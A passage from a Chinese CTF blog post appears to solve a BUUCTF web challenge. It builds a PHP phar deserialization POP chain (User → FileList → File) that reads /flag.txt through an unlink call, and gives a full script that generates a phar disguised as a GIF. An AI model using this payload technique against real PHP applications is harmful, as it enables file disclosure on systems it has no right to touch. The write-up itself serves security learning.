<p>在删除文件的时候会调用<code>File</code>类的<code>delete()</code>函数，其中存在文件操作函数<code>unlink</code>，并且<code>phar</code>文件可以被上传到服务器，关键字符都没有被过滤，那么可以利用一下</p>
<p>在<code>File</code>类中存在文件读取操作函数<code>close</code></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215145702.png" alt=""></p>
<p>而在<code>User</code>类中，存在<code>__destruct</code>方法来调用自己类的<code>close</code>方法</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215152523.png" alt=""></p>
<p>如果这里设置</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">  $filename = <span class="string">"flag.txt"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $db = <span class="keyword">new</span> File();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>即可实现<code>User</code>类中调用<code>File</code>的<code>close()</code>方法，实现<code>flag.txt</code>的读取</p>
<p>但这样直接调用是没有回显的</p>
<p>但看到<code>FileList</code>的<code>__call</code>方法<img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215152738.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215152503.png" alt=""></p>
<p>这里<code>__destruct</code>函数会把<code>result</code>给打印出来</p>
<p>而这里的<code>$file</code>参数可控，那么就可以实现通过<code>__destruct</code>方法来打印出我们需要的<code>flag</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $filename = <span class="string">"/flag.txt"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="keyword">new</span> File());</span><br><span class="line">		<span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $db;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">	$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">	$phar-&gt;startBuffering();</span><br><span class="line">	$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub, 增加gif文件头，伪造文件类型</span></span><br><span class="line">	$o = <span class="keyword">new</span> User();</span><br><span class="line">	$phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">	$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">	<span class="comment">//签名自动计算</span></span><br><span class="line">	$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>大致流程是：</p>
<ol>
<li><code>User</code>这边声明<code>$db</code>为<code>FileList</code>对象，此时<code>User</code>的<code>__destruct</code>触发了<code>close</code>方法，但<code>FlieList</code>类中不存在<code>close</code>方法，触发了<code>__call</code>方法</li>
<li>这边由于<code>File</code>类中存在<code>colse</code>方法，并且方法作用返回文件内容，那么根据<code>FileList</code>类的<code>__call</code>方法来设置<code>$files</code>为<code>File</code>类，注意这里是<code>Array</code>，然后调用<code>File</code>类的<code>close</code>方法</li>
<li><code>FlieList</code>类中的<code>__call</code>能够执行<code>File</code>类的close方法的运行结果并存储到<code>$results</code>变量中，最后通过<code>__destruct</code>来打印出结果</li>
<li>总体类间顺序为<code>User-&gt;FileList-&gt;File</code></li>
</ol>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215162007.png" alt=""></p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">A2u13</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://a2u13.com/2020/02/13/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/">https://a2u13.com/2020/02/13/BUUCTF刷题笔记（三）/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://a2u13.com" target="_blank">A2u13's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/BUUCTF/">BUUCTF</a></div><div class="post_share"><div class="social-share" data-image="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222936.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2020/02/15/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89/"><img class="prev_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">BUUCTF刷题笔记（四）</div></div></a></div><div class="next-post pull_right"><a href="/2020/02/12/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"><img class="next_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUUCTF刷题笔记（二）</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2020/02/12/BUUCTF刷题笔记（一）/" title="BUUCTF刷题笔记（一）"><img class="relatedPosts_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-12</div><div class="relatedPosts_title">BUUCTF刷题笔记（一）</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/17/BUUCTF刷题笔记（五）/" title="BUUCTF刷题笔记（五）"><img class="relatedPosts_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-17</div><div class="relatedPosts_title">BUUCTF刷题笔记（五）</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/12/BUUCTF刷题笔记（二）/" title="BUUCTF刷题笔记（二）"><img class="relatedPosts_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-12</div><div class="relatedPosts_title">BUUCTF刷题笔记（二）</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/15/BUUCTF刷题笔记（四）/" title="BUUCTF刷题笔记（四）"><img class="relatedPosts_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-15</div><div class="relatedPosts_title">BUUCTF刷题笔记（四）</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/28/BUUCTF刷题笔记（六）/" title="BUUCTF刷题笔记（六）"><img class="relatedPosts_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-28</div><div class="relatedPosts_title">BUUCTF刷题笔记（六）</div></div></a></div></div><div class="clear_both"></div></div></article></main><footer id="footer" style="background-image: url(https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png)" data-type="photo"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2020 By A2u13</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@3/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {
      pangu.spacingElementById('content-inner')
})</script><script src="/js/search/local-search.js"></script></body></html>